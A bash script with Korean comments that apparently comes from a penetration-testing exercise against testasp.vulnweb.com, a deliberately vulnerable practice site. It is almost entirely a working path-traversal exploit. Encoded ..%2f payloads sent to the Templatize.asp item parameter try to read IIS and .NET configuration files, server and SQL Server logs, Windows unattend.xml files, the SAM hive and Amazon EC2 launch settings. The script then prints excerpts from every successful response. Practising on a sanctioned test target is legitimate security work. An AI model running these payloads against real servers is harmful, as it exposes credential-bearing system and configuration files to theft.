#!/usr/bin/env bash
# Round 7 Part A — 읽기 전용: 웹루트 밖 IIS/설정/로그 민감 파일 열거 (Templatize LFI, 승인 불요)
# 깊이 기준(실측): 웹루트 = C:\<X>\<Y>  →  ..%2f×2 = C:\   /  ..%2f×3 이상도 C:\ (clamp)
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; mkdir -p "$OUT"
CURL=(curl -s --noproxy '*' --max-time 25)

probe() { # $1=label  $2=item
  local label="$1" item="$2" code size
  read -r code size < <("${CURL[@]}" -o "$OUT/a_$label.html" -w "%{http_code} %{size_download}" \
      "$BASE/Templatize.asp?item=$item")
  printf "%-24s %-70s %s %s\n" "$label" "$item" "$code" "$size"
}

echo "### A1. IIS 설정 계열 (..%2f×2 = C:\\)"
printf "%-24s %-70s %s %s\n" LABEL PATH CODE SIZE
probe iis_apphost            "..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fapplicationHost.config"
probe iis_redirection        "..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fredirection.config"
probe iis_administration     "..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fadministration.config"
probe iis_schema             "..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fschema%2fIIS_schema.xml"
probe metabase_xml           "..%2f..%2fwindows%2fsystem32%2finetsrv%2fmetabase.xml"
probe config_history_1       "..%2f..%2finetpub%2fhistory%2fCFGHISTORY_0000000001%2fapplicationHost.config"
probe inetpub_wwwroot_db     "..%2f..%2finetpub%2fwwwroot%2fdb.asp"
echo
echo "### A2. .NET 머신 설정 / 로그"
probe net_machineconfig_v4   "..%2f..%2fwindows%2fmicrosoft.net%2fframework64%2fv4.0.30319%2fconfig%2fmachine.config"
probe net_webconfig_v4       "..%2f..%2fwindows%2fmicrosoft.net%2fframework64%2fv4.0.30319%2fconfig%2fweb.config"
probe net_machineconfig_v2   "..%2f..%2fwindows%2fmicrosoft.net%2fframework64%2fv2.0.50727%2fconfig%2fmachine.config"
probe httperr_log            "..%2f..%2fwindows%2fsystem32%2flogfiles%2fhttperr%2fhttperr1.log"
probe iislog_w3svc1_a        "..%2f..%2finetpub%2flogs%2flogfiles%2fw3svc1%2fu_ex260923.log"
probe iislog_w3svc1_b        "..%2f..%2finetpub%2flogs%2flogfiles%2fw3svc1%2fu_ex260922.log"
probe iislog_alt             "..%2flogs%2flogfiles%2fw3svc1%2fu_ex260923.log"
echo
echo "### A3. Windows / EC2 / SQL Server"
probe panther_unattend       "..%2f..%2fwindows%2fpanther%2funattend.xml"
probe panther_unattend_dir   "..%2f..%2fwindows%2fpanther%2funattend%2funattend.xml"
probe sysprep_unattend       "..%2f..%2fwindows%2fsystem32%2fsysprep%2funattend.xml"
probe sam_locked             "..%2f..%2fwindows%2fsystem32%2fconfig%2fsam"
probe ec2config_xml          "..%2f..%2fprogram%20files%2famazon%2fec2configservice%2fsettings%2fconfig.xml"
probe ec2launch_json         "..%2f..%2fprogramdata%2famazon%2fec2-windows%2flaunch%2fconfig%2flaunchconfig.json"
probe sql_errorlog_11        "..%2f..%2fprogram%20files%2fmicrosoft%20sql%20server%2fmssql11.mssqlserver%2fmssql%2flog%2ferrorlog"
probe sql_errorlog_12        "..%2f..%2fprogram%20files%2fmicrosoft%20sql%20server%2fmssql12.mssqlserver%2fmssql%2flog%2ferrorlog"
probe sql_errorlog_13        "..%2f..%2fprogram%20files%2fmicrosoft%20sql%20server%2fmssql13.mssqlserver%2fmssql%2flog%2ferrorlog"
probe sql_errorlog_14        "..%2f..%2fprogram%20files%2fmicrosoft%20sql%20server%2fmssql14.mssqlserver%2fmssql%2flog%2ferrorlog"
echo
echo "### A4. 200 히트 본문 발췌"
for f in iis_apphost iis_redirection iis_administration iis_schema metabase_xml config_history_1 \
         net_machineconfig_v4 net_webconfig_v4 httperr_log iislog_w3svc1_a ec2config_xml \
         ec2launch_json sql_errorlog_11 sql_errorlog_12 sql_errorlog_13 panther_unattend; do
  if [ -s "$OUT/a_$f.html" ] && [ "$(stat -c%s "$OUT/a_$f.html")" -gt 1300 ]; then
    echo "===== $f ($(stat -c%s "$OUT/a_$f.html")B) ====="
    python3 - "$OUT/a_$f.html" <<'EOF'
import sys,re,html
s=open(sys.argv[1],encoding="latin-1",errors="replace").read()
i=s.find("MainContentLeft")
seg=s[i:i+1400] if i!=-1 else s[:1400]
print(html.unescape(seg).replace("\r","")[:1200])
EOF
    echo
  fi
done
